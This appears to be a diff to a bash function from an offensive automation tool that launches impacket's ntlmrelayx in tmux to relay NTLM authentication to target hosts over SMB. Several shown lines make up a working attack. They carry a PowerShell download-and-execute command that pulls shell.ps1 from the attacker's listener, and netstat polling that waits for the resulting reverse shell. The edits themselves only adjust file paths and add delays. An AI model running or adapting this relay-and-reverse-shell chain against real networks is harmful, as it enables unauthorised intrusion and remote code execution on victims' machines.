@@ -215,7 +215,8 @@ function relayingAttack(){
 
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
   command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
-  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd impacket/ && python3 $(pwd)/impacket/ntlmrelayx.py -tf $targets -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
+  cp $targets $(pwd)/impacket/targets.txt
+  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
 
 
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
@@ -245,6 +246,8 @@ function relayingAttack(){
     portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u)
     sleep 0.5
   done
+  
+  sleep 3
 
   rhost=$(netstat -tnualp | grep $lport | awk '{print $4}' | tail -1 | awk -F: '{print $1}')
   checkrhost=''
@@ -253,6 +256,8 @@ function relayingAttack(){
       checkrhost=1
     fi
   done < $targets
+  
+  sleep 3
 
   if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
     echo -ne "${blueColour}[*]${endColour} Authenticating to target $rhost "
